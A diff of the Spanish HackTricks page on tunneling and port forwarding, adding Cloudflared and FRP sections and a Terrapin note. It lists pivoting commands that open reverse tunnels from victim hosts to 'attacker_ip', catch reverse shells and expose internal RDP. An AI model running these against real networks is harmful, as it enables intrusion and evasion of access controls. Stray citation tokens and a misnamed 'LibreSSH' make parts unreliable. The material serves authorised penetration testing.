@@ -1,4 +1,4 @@
-# Tunneling and Port Forwarding
+# Túneles y Reenvío de Puertos
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -55,9 +55,9 @@ Puerto local --> Host comprometido (SSH) --> Donde sea
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Reverse Port Forwarding
+### Reenvío de Puertos Inverso
 
-Esto es útil para obtener shells reversos de hosts internos a través de una DMZ a tu host:
+Esto es útil para obtener shells inversos de hosts internos a través de una DMZ a tu host:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -87,10 +87,14 @@ Establecer una nueva ruta en el lado del cliente
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **Seguridad – Ataque Terrapin (CVE-2023-48795)**
+> El ataque de degradación Terrapin de 2023 puede permitir que un atacante de tipo man-in-the-middle manipule el primer apretón de manos SSH e inyecte datos en **cualquier canal redirigido** ( `-L`, `-R`, `-D` ). Asegúrese de que tanto el cliente como el servidor estén parcheados (**OpenSSH ≥ 9.6/LibreSSH 6.7**) o desactive explícitamente los algoritmos vulnerables `chacha20-poly1305@openssh.com` y `*-etm@openssh.com` en `sshd_config`/`ssh_config` antes de confiar en túneles SSH. citeturn4search0
+
 ## SSHUTTLE
 
-Puedes **túnel** a través de **ssh** todo el **tráfico** a una **subred** a través de un host.\
-Por ejemplo, reenvía todo el tráfico que va a 10.10.10.0/24
+Puede **túnel** a través de **ssh** todo el **tráfico** a una **subred** a través de un host.\
+Por ejemplo, redirigiendo todo el tráfico que va a 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -145,7 +149,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host de beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
+> En este caso, el **puerto se abre en el host beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -195,7 +199,7 @@ Necesitas usar la **misma versión para el cliente y el servidor**
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**Usa la misma versión para el agente y el proxy**
+**Utiliza la misma versión para el agente y el proxy**
 
 ### Tunneling
 ```bash
@@ -320,7 +324,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).
+Es como una versión de consola de PuTTY (las opciones son muy similares a un cliente ssh).
 
 Como este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio y puerto ssh para poder tener una conexión inversa. Luego, para redirigir solo un puerto accesible localmente a un puerto en nuestra máquina:
 ```bash
@@ -346,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Necesitas tener **acceso RDP sobre el sistema**.\
 Descargar:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **túnel de paquetes sobre la conexión RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **tunneling packets over the RDP connection**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
@@ -480,7 +484,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **es una herramienta para exponer soluciones a Internet en una línea de comando.**\
-_La URI de exposición es como:_ **UID.ngrok.io**
+_Las URI de exposición son como:_ **UID.ngrok.io**
 
 ### Instalación
 
@@ -541,6 +545,71 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
+## Cloudflared (Cloudflare Tunnel)
+
+El daemon `cloudflared` de Cloudflare puede crear túneles salientes que exponen **servicios TCP/UDP locales** sin requerir reglas de firewall de entrada, utilizando el borde de Cloudflare como punto de encuentro. Esto es muy útil cuando el firewall de salida solo permite tráfico HTTPS pero las conexiones de entrada están bloqueadas.
+
+### Comando rápido para túnel
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 pivot
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### Túneles persistentes con DNS
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+Iniciar el conector:
+```bash
+cloudflared tunnel run mytunnel
+```
+Porque todo el tráfico sale del host **saliente por 443**, los túneles de Cloudflared son una forma simple de eludir las ACL de ingreso o los límites de NAT. Ten en cuenta que el binario generalmente se ejecuta con privilegios elevados; usa contenedores o la bandera `--user` cuando sea posible. citeturn1search0
+
+## FRP (Fast Reverse Proxy)
+
+[`frp`](https://github.com/fatedier/frp) es un proxy inverso en Go que se mantiene activamente y que soporta **TCP, UDP, HTTP/S, SOCKS y P2P NAT-hole-punching**. A partir de **v0.53.0 (mayo de 2024)**, puede actuar como un **SSH Tunnel Gateway**, por lo que un host objetivo puede crear un túnel inverso utilizando solo el cliente OpenSSH estándar; no se requiere binario adicional.
+
+### Túnel TCP inverso clásico
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### Usando la nueva puerta de enlace SSH (sin binario frpc)
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+El comando anterior publica el puerto de la víctima **8080** como **attacker_ip:9000** sin desplegar ninguna herramienta adicional, lo que es ideal para pivotar aprovechando recursos existentes. citeturn2search1
+
 ## Otras herramientas para verificar
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
